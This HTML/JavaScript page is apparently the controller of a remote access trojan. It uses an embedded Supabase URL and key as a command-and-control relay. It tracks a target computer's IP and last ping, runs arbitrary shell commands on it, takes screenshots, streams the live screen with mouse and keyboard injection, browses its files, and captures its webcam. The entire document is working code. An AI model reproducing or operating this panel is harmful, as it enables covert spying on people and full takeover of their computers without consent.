<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Client</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden}
::-webkit-scrollbar{width:8px}
::-webkit-scrollbar-track{background:#0a0c10}
::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:#484f58}
.header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:1px solid #21262d;padding:0 1.5rem;display:flex;align-items:center;height:60px;position:sticky;top:0;z-index:100;gap:1rem}
.header .back{color:#58a6ff;text-decoration:none;font-size:1.3rem;font-weight:700;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:8px;transition:all .2s}
.header .back:hover{background:rgba(88,166,255,.1)}
.header h1{color:#f0f6fc;font-size:1.05rem;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.header .meta{color:#8b949e;font-size:.8rem;text-align:right}
.main{padding:1.25rem 1.5rem;max-width:1400px;margin:0 auto}
.tabs{display:flex;gap:.35rem;margin-bottom:1rem;border-bottom:1px solid #21262d;padding-bottom:.5rem;overflow-x:auto}
.tab{background:transparent;color:#8b949e;border:none;padding:.5rem 1rem;cursor:pointer;font-size:.85rem;font-weight:500;border-radius:8px 8px 0 0;transition:all .2s;white-space:nowrap;display:flex;align-items:center;gap:.4rem}
.tab:hover{color:#e6edf3;background:rgba(255,255,255,.04)}
.tab.active{color:#58a6ff;background:rgba(88,166,255,.08);box-shadow:inset 0 -2px 0 #58a6ff}
.panel{display:none;animation:fadeIn .25s ease}
.panel.active{display:block}
@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
.cmd-wrap{display:flex;gap:.5rem;margin-bottom:.5rem}
.cmd-wrap input{flex:1;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:.6rem .8rem;color:#e6edf3;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.85rem;outline:none;transition:border-color .2s}
.cmd-wrap input:focus{border-color:#58a6ff}
.output{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:1rem;color:#e6edf3;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.82rem;min-height:400px;max-height:70vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5}
.output .prompt{color:#58a6ff;font-weight:600}
.screenshot{max-width:100%;border-radius:10px;border:1px solid #21262d;display:block;background:#000}
.loading{color:#484f58;text-align:center;padding:2rem;font-size:.9rem}
.loading .spinner{display:inline-block;width:20px;height:20px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;margin-right:.5rem;vertical-align:middle}
@keyframes spin{to{transform:rotate(360deg)}}
.btn{border:none;padding:.45rem 1rem;border-radius:8px;cursor:pointer;font-size:.85rem;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:.4rem}
.btn:active{transform:scale(.96)}
.btn-primary{background:linear-gradient(135deg,#238636,#2ea043);color:#fff}
.btn-primary:hover{box-shadow:0 4px 12px rgba(35,134,54,.3);transform:translateY(-1px)}
.btn-accent{background:linear-gradient(135deg,#1f6feb,#58a6ff);color:#fff}
.btn-accent:hover{box-shadow:0 4px 12px rgba(31,111,235,.3);transform:translateY(-1px)}
.btn-danger{background:linear-gradient(135deg,#da3633,#f85149);color:#fff}
.btn-danger:hover{box-shadow:0 4px 12px rgba(218,54,51,.3);transform:translateY(-1px)}
.btn-ghost{background:transparent;color:#8b949e;border:1px solid #30363d}
.btn-ghost:hover{background:#21262d;color:#e6edf3}
.btn-orange{background:linear-gradient(135deg,#d29922,#e3b341);color:#fff}
.btn-orange:hover{box-shadow:0 4px 12px rgba(210,153,34,.3);transform:translateY(-1px)}
.btn.active-toggle{outline:2px solid #58a6ff;outline-offset:2px;background:rgba(88,166,255,.15)!important;border-color:#58a6ff!important;color:#58a6ff!important}
.screen-container{position:relative;display:inline-block;max-width:100%}
.screen-container canvas{position:absolute;top:0;left:0;cursor:crosshair}
.ctrl-bar{display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap;align-items:center;padding:.6rem 1rem;background:#161b22;border:1px solid #21262d;border-radius:10px}
.ctrl-bar .sep{color:#30363d;margin:0 .3rem}
.err{color:#f85149;font-size:.82rem;padding:.6rem .8rem;background:#161b22;border:1px solid #da3633;border-radius:8px;margin-bottom:.5rem;display:none}
.files{background:#161b22;border:1px solid #21262d;border-radius:10px;min-height:300px;max-height:70vh;overflow-y:auto;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.82rem}
.files .path{background:#0d1117;border-bottom:1px solid #21262d;padding:.5rem .8rem;color:#58a6ff;display:flex;align-items:center;gap:.5rem;border-radius:10px 10px 0 0;position:sticky;top:0;z-index:2}
.files .path span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.files .entry{padding:.4rem .8rem;cursor:pointer;display:flex;align-items:center;gap:.6rem;border-bottom:1px solid #161b22;transition:background .15s}
.files .entry:last-child{border-bottom:none}
.files .entry:hover{background:rgba(88,166,255,.08)}
.files .entry .ico{flex-shrink:0;width:1.4rem;text-align:center;font-size:.9rem}
.files .entry .ico.folder{color:#d29922}
.files .entry .ico.file{color:#8b949e}
.files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#e6edf3}
.files .entry.dir .nm{color:#f0f6fc}
.files .entry .sz{color:#484f58;font-size:.75rem;white-space:nowrap;min-width:6rem;text-align:right}
.files .entry .dt{color:#484f58;font-size:.75rem;white-space:nowrap;min-width:9rem;text-align:right}
select.mon{background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:8px;padding:.45rem .6rem;font-size:.85rem;outline:none;cursor:pointer}
select.mon:focus{border-color:#58a6ff}
.capture-bar{display:flex;gap:.5rem;margin-bottom:1rem;align-items:center;flex-wrap:wrap}

@media(max-width:768px){
.main{padding:1rem}
.tabs{overflow-x:auto;-webkit-overflow-scrolling:touch}
.tab{padding:.4rem .7rem;font-size:.8rem}
.ctrl-bar{padding:.5rem}
.files .entry .dt{display:none}
.header .meta{display:none}
}
</style>
</head>
<body>
<div class="header">
  <a class="back" href="index.html">â†</a>
  <h1 id="name">-</h1>
  <div class="meta" id="meta">-</div>
</div>
<div class="main">
  <div class="tabs">
    <div class="tab active" onclick="switchTab(this,'cmd')">CMD</div>
    <div class="tab" onclick="switchTab(this,'screenshot')">Screenshot</div>
    <div class="tab" onclick="switchTab(this,'screen')">Screen</div>
    <div class="tab" onclick="switchTab(this,'files')">Files</div>
    <div class="tab" onclick="switchTab(this,'webcam')">Webcam</div>
  </div>

  <div class="panel active" id="panel-cmd">
    <div class="cmd-wrap">
      <input id="cmdInput" placeholder="Type command and press Enter..." onkeydown="if(event.key==='Enter')runCmd()">
      <button class="btn btn-accent" onclick="runCmd()">Run</button>
    </div>
    <div class="output" id="cmdOutput">Ready.</div>
    <div id="cmdErr" class="err"></div>
  </div>

  <div class="panel" id="panel-screenshot">
    <div class="capture-bar">
      <select class="mon" id="monSelect"><option value="0">Monitor 1</option></select>
      <button class="btn btn-primary" onclick="takeScreenshot()">Take Screenshot</button>
    </div>
    <div id="ssResult"><div class="loading">Click button to capture</div></div>
    <div id="ssErr" class="err"></div>
  </div>

  <div class="panel" id="panel-screen">
    <div class="ctrl-bar">
      <button class="btn btn-primary" id="screenStartBtn" onclick="startScreen()">â–¶ Start Live</button>
      <button class="btn btn-danger" id="screenStopBtn" onclick="stopScreen()" style="display:none">â–  Stop</button>
      <span class="sep">|</span>
      <button class="btn btn-ghost" id="mouseBtn" onclick="toggleMouse()">Mouse OFF</button>
      <button class="btn btn-ghost" id="keyBtn" onclick="toggleKeyboard()">Keyboard OFF</button>
      <span id="screenFps" style="color:#8b949e;font-size:.8rem;margin-left:auto"></span>
    </div>
    <div id="screenResult"><div class="loading">Click Start to begin live view</div></div>
  </div>

  <div class="panel" id="panel-files">
    <div class="files" id="filesBrowser">
      <div class="loading">Click a directory to browse</div>
    </div>
    <div id="filesErr" class="err"></div>
  </div>

  <div class="panel" id="panel-webcam">
    <div class="capture-bar">
      <button class="btn btn-primary" onclick="takeWebcam()">Capture Webcam</button>
    </div>
    <div id="wcResult"><div class="loading">Click button to capture</div></div>
    <div id="wcErr" class="err"></div>
  </div>
</div>

<script>
const SB='https://odocuexiouhmmkpwtuwk.supabase.co';
const KEY='sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED';
const H={headers:{apikey:KEY,Authorization:'Bearer '+KEY}};
const PH={apikey:KEY,Authorization:'Bearer '+KEY,'Content-Type':'application/json','Prefer':'return=representation'};
const FH={apikey:KEY,Authorization:'Bearer '+KEY,'Content-Type':'application/json','Prefer':'return=minimal'};
const params=new URLSearchParams(window.location.search);
const computer=params.get('name')||'';

document.getElementById('name').textContent=computer||'Unknown';
document.title=computer||'Client';

(async()=>{
 try{
  const r=await fetch(SB+'/rest/v1/pings?computer=eq.'+encodeURIComponent(computer)+'&order=id.desc&limit=1',H);
  if(!r.ok)return;
  const p=await r.json();
  if(p.length)document.getElementById('meta').textContent='IP: '+(p[0].ip||'?')+' | Last: '+new Date(p[0].created_at).toLocaleString();
 }catch{}
})();

function switchTab(el,name){
 document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
 document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
 el.classList.add('active');
 document.getElementById('panel-'+name).classList.add('active');
 if(name==='files'&&!filePath)browseDir('');
}

async function sendAndWait(type,payload,el,errId){
 const errEl=document.getElementById(errId);
 if(errEl)errEl.style.display='none';
 el.innerHTML='<div class="loading"><span class="spinner"></span>Sending...</div>';
 try{
  const r=await fetch(SB+'/rest/v1/commands',{method:'POST',headers:PH,body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
  if(!r.ok){el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(errEl){errEl.textContent='Server returned '+r.status;errEl.style.display='block';}return null;}
  const rows=await r.json();
  const cmdId=rows&&rows.length?rows[0].id:0;
  if(!cmdId){el.innerHTML='<div class="loading">Failed to send</div>';if(errEl){errEl.textContent='No command ID returned';errEl.style.display='block';}return null;}
  el.innerHTML='<div class="loading"><span class="spinner"></span>Waiting for response...</div>';
  for(let i=0;i<60;i++){
   await new Promise(r=>setTimeout(r,200));
   try{
    const r=await fetch(SB+'/rest/v1/commands?id=eq.'+cmdId,H);
    if(!r.ok)continue;
    const rows=await r.json();
    if(rows.length&&rows[0].status==='done'){
     if(rows[0].result==='exec_err'&&errEl){errEl.textContent='Execution error on client';errEl.style.display='block';}
     return rows[0];
    }
   }catch{}
  }
  el.innerHTML='<div class="loading">Timeout — no response</div>';
  if(errEl){errEl.textContent='Client did not respond within 60s';errEl.style.display='block';}
  return null;
 }catch(e){el.innerHTML='<div class="loading">Error</div>';if(errEl){errEl.textContent=e.message||'unknown';errEl.style.display='block';}return null;}
}

async function runCmd(){
 const input=document.getElementById('cmdInput');
 const cmd=input.value.trim();
 if(!cmd)return;
 const out=document.getElementById('cmdOutput');
 out.textContent+='> '+cmd+'\n';
 input.value='';
 const res=await sendAndWait('cmd',cmd,out,'cmdErr');
 if(res){
  out.textContent+=(res.result||'(no output)')+'\n';
  out.scrollTop=out.scrollHeight;
 }
}

async function takeScreenshot(){
 const el=document.getElementById('ssResult');
 const mon=document.getElementById('monSelect').value;
 const res=await sendAndWait('screenshot',mon,el,'ssErr');
 if(res&&res.result){
  el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
 }else if(res){
  el.innerHTML='<div class="loading">Empty result received</div>';
 }
}

async function takeWebcam(){
 const el=document.getElementById('wcResult');
 const errEl=document.getElementById('wcErr');
 errEl.style.display='none';
 const res=await sendAndWait('webcam','',el,'wcErr');
 if(res&&res.result){
  el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
 }else if(res){
  el.innerHTML='<div class="loading">Empty result received</div>';
 }
}

async function startScreen(){
 document.getElementById('screenStartBtn').style.display='none';
 document.getElementById('screenStopBtn').style.display='';
 screenInterval=setInterval(pollScreen,250);
 frameCount=0;
 fpsTime=Date.now();
}

async function pollScreen(){
 try{
  const r=await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(computer)+'&type=eq.screen_live&status=eq.done&order=id.desc&limit=1',H);
  if(!r.ok)return;
  const rows=await r.json();
  if(rows.length&&rows[0].result){
   const t=new Date(rows[0].created_at).getTime();
   if(Date.now()-t<30000){
    const el=document.getElementById('screenResult');
    const imgSrc='data:image/jpeg;base64,'+rows[0].result;
    if(el.querySelector('img')){
     el.querySelector('img').src=imgSrc;
    }else{
     el.innerHTML='<div class="screen-container"><img class="screenshot" id="screenImg" src="'+imgSrc+'"><canvas id="screenCanvas"></canvas></div>';
     setupCanvas();
    }
    pollLastTime=t;
    frameCount++;
    if(Date.now()-fpsTime>=2000){
     document.getElementById('screenFps').textContent=Math.round(frameCount/((Date.now()-fpsTime)/1000))+' fps';
     frameCount=0;
     fpsTime=Date.now();
    }
   }else if(pollLastTime&&Date.now()-pollLastTime>15000){
    const el=document.getElementById('screenResult');
    if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
    document.getElementById('screenFps').textContent='';
   }
  }else if(pollLastTime&&Date.now()-pollLastTime>15000){
   const el=document.getElementById('screenResult');
   if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
   document.getElementById('screenFps').textContent='';
  }
 }catch{}
}

function setupCanvas(){
 const img=document.getElementById('screenImg');
 const c=document.getElementById('screenCanvas');
 if(!img||!c)return;
 const resize=()=>{
  c.width=img.clientWidth;
  c.height=img.clientHeight;
  c.style.width=img.clientWidth+'px';
  c.style.height=img.clientHeight+'px';
 };
 img.onload=resize;
 setTimeout(resize,100);
}

function getScreenCoords(e){
 const c=document.getElementById('screenCanvas');
 const img=document.getElementById('screenImg');
 if(!c||!img)return null;
 const rect=c.getBoundingClientRect();
 const cx=e.clientX-rect.left;
 const cy=e.clientY-rect.top;
 const sx=Math.round(cx*img.naturalWidth/c.width);
 const sy=Math.round(cy*img.naturalHeight/c.height);
 return {x:sx,y:sy};
}

async function sendFireForget(type,payload){
 try{
  await fetch(SB+'/rest/v1/commands',{method:'POST',headers:FH,body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
 }catch{}
}

function toggleMouse(){
 mouseOn=!mouseOn;
 const btn=document.getElementById('mouseBtn');
 btn.textContent=mouseOn?'Mouse ON':'Mouse OFF';
 btn.classList.toggle('active-toggle',mouseOn);
 const c=document.getElementById('screenCanvas');
 if(mouseOn&&c){
  c.style.cursor='crosshair';
  c.onmousedown=function(e){
   if(!mouseOn)return;
   const p=getScreenCoords(e);
   if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}));
  };
  c.onmouseup=function(e){
   if(!mouseOn)return;
   const p=getScreenCoords(e);
   if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}));
  };
  c.onmousemove=function(e){
   if(!mouseOn)return;
   const now=Date.now();
   if(now-mouseThrottle<50)return;
   mouseThrottle=now;
   const p=getScreenCoords(e);
   if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}));
  };
 }else if(c){
  c.onmousedown=null;
  c.onmouseup=null;
  c.onmousemove=null;
  c.style.cursor='default';
 }
}

function toggleKeyboard(){
 keyOn=!keyOn;
 const btn=document.getElementById('keyBtn');
 btn.textContent=keyOn?'Keyboard ON':'Keyboard OFF';
 btn.classList.toggle('active-toggle',keyOn);
}

document.addEventListener('keydown',function(e){
 if(!keyOn)return;
 if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;
 e.preventDefault();
 sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'down'}));
});

document.addEventListener('keyup',function(e){
 if(!keyOn)return;
 if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;
 e.preventDefault();
 sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'up'}));
});

function stopScreen(){
 if(screenInterval){clearInterval(screenInterval);screenInterval=null}
 document.getElementById('screenStartBtn').style.display='';
 document.getElementById('screenStopBtn').style.display='none';
 document.getElementById('screenFps').textContent='';
 document.getElementById('screenResult').innerHTML='<div class="loading">Stopped</div>';
 if(mouseOn)toggleMouse();
  if(keyOn)toggleKeyboard();
}

let filePath='';
let fileLoading=false;

(async function initMonitors(){
 try{
  await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(computer)+'&type=eq.screenshot&status=eq.done&order=id.desc&limit=1',H);
 }catch{}
 const sel=document.getElementById('monSelect');
 if(sel)sel.innerHTML='<option value="0">Monitor 1</option><option value="-1">All Monitors</option>';
})();

async function browseDir(path){
 if(fileLoading)return;
 fileLoading=true;
 const el=document.getElementById('filesBrowser');
 const errEl=document.getElementById('filesErr');
 errEl.style.display='none';
 el.innerHTML='<div class="loading"><span class="spinner"></span>Loading...</div>';
 const res=await sendAndWait('file_list',path,el,'filesErr');
 if(res&&res.result){
  filePath=path||'';
  renderFiles(res.result);
 }
 fileLoading=false;
}

function renderFiles(json){
 const el=document.getElementById('filesBrowser');
 let entries;
 try{entries=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}
 if(!Array.isArray(entries)){el.innerHTML='<div class="loading">Bad response</div>';return}
 let html='<div class="path"><span>'+esc(filePath||'This PC')+'</span>';
 if(filePath)html+='<button class="btn btn-ghost btn-sm" style="padding:.2rem .6rem;font-size:.75rem" onclick="browseDir(\'\')">Root</button>';
 if(filePath){
  const p=filePath.replace(/\\+$/,'');
  const idx=p.lastIndexOf('\\');
  if(idx>0)html+='<button class="btn btn-ghost btn-sm" style="padding:.2rem .6rem;font-size:.75rem" onclick="browseDir(\''+esc(p.substr(0,idx+1))+'\')">Up</button>';
 }
 html+='</div>';
 entries.forEach(e=>{
  const nm=e.n||'?';
  const isDir=e.d===true||e.d==='true';
  const sz=e.s||0;
  const dt=e.m||'';
  const szStr=sz<1024?sz+' B':sz<1048576?(sz/1024).toFixed(1)+' KB':(sz/1048576).toFixed(1)+' MB';
  html+='<div class="entry'+(isDir?' dir':'')+'" onclick="'+(isDir?'browseDir(\''+esc(filePath+nm+'\\')+'\')':'')+'">';
  html+='<div class="ico '+(isDir?'folder':'file')+'">'+(isDir?'â–¶':'â—‹')+'</div>';
  html+='<div class="nm">'+esc(nm)+'</div>';
  html+=isDir?'<div class="sz"></div>':'<div class="sz">'+szStr+'</div>';
  html+='<div class="dt">'+esc(dt)+'</div>';
  html+='</div>';
 });
 el.innerHTML=html;
}
</script>
</body>
</html>
